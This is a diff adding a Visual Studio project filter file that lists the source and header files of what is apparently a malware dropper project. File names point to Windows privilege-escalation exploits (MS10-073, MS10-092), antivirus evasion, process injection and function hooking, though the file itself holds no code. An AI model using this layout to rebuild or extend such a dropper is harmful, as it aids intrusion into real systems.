@@ -1,0 +1,110 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
+  <ItemGroup>
+    <Filter Include="Source Files">
+      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
+      <Extensions>cpp;c;cc;cxx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
+    </Filter>
+    <Filter Include="Source Files\share">
+      <UniqueIdentifier>{83c8add1-1786-4fe2-8db7-ac8408ef86fa}</UniqueIdentifier>
+    </Filter>
+    <Filter Include="Header Files">
+      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
+      <Extensions>h;hpp;hxx;hm;inl;inc;xsd</Extensions>
+    </Filter>
+    <Filter Include="Header Files\share">
+      <UniqueIdentifier>{94a0cd2d-4d57-4ee6-a1ea-f4d099b8deb1}</UniqueIdentifier>
+    </Filter>
+  </ItemGroup>
+  <ItemGroup>
+    <ClCompile Include="..\share\inet.cpp">
+      <Filter>Source Files\share</Filter>
+    </ClCompile>
+    <ClCompile Include="..\share\rc4.cpp">
+      <Filter>Source Files\share</Filter>
+    </ClCompile>
+    <ClCompile Include="..\share\secconfig.cpp">
+      <Filter>Source Files\share</Filter>
+    </ClCompile>
+    <ClCompile Include="..\share\splice.cpp">
+      <Filter>Source Files\share</Filter>
+    </ClCompile>
+    <ClCompile Include="..\share\utils.cpp">
+      <Filter>Source Files\share</Filter>
+    </ClCompile>
+    <ClCompile Include="..\share\xstring.cpp">
+      <Filter>Source Files\share</Filter>
+    </ClCompile>
+    <ClCompile Include="..\share\zdisasm.cpp">
+      <Filter>Source Files\share</Filter>
+    </ClCompile>
+    <ClCompile Include="dropper.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="com_elevation\com_elevation.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="ms10_073\kernelshell.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="ms10_073\ms10_073.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="ms10_092\ms10_092.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="spooler\antiav.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="spooler\spooler.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+    <ClCompile Include="inject\inject.cpp">
+      <Filter>Source Files</Filter>
+    </ClCompile>
+  </ItemGroup>
+  <ItemGroup>
+    <ClInclude Include="..\share\inet.h">
+      <Filter>Header Files\share</Filter>
+    </ClInclude>
+    <ClInclude Include="..\share\rc4.h">
+      <Filter>Header Files\share</Filter>
+    </ClInclude>
+    <ClInclude Include="..\share\secconfig.h">
+      <Filter>Header Files\share</Filter>
+    </ClInclude>
+    <ClInclude Include="..\share\splice.h">
+      <Filter>Header Files\share</Filter>
+    </ClInclude>
+    <ClInclude Include="..\share\utils.h">
+      <Filter>Header Files\share</Filter>
+    </ClInclude>
+    <ClInclude Include="..\share\xstring.h">
+      <Filter>Header Files\share</Filter>
+    </ClInclude>
+    <ClInclude Include="..\share\zdisasm.h">
+      <Filter>Header Files\share</Filter>
+    </ClInclude>
+    <ClInclude Include="com_elevation\com_elevation.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="ms10_073\kernelshell.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="ms10_073\ms10_073.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="ms10_092\ms10_092.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="spooler\antiav.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="spooler\spooler.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+    <ClInclude Include="inject\inject.h">
+      <Filter>Header Files</Filter>
+    </ClInclude>
+  </ItemGroup>
+</Project>
